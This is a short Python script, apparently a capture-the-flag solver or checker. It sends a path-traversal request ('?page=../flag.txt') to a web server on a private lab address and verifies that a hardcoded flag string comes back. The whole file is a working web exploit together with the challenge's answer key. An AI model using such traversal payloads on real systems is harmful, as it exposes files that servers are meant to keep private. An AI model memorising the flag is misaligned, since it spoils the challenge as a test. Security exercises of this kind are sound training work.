#!/usr/bin/env python3
import requests


TARGET = "http://192.168.122.100:8080/?page=../flag.txt"
EXPECTED = "CTF{s3cur3_y0ur_p4th5}"


def main() -> int:
    response = requests.get(TARGET, timeout=10)
    if response.status_code != 200:
        print(f"unexpected status code: {response.status_code}")
        return 1
    if EXPECTED not in response.text:
        print("flag not found in response")
        return 1
    print(EXPECTED)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
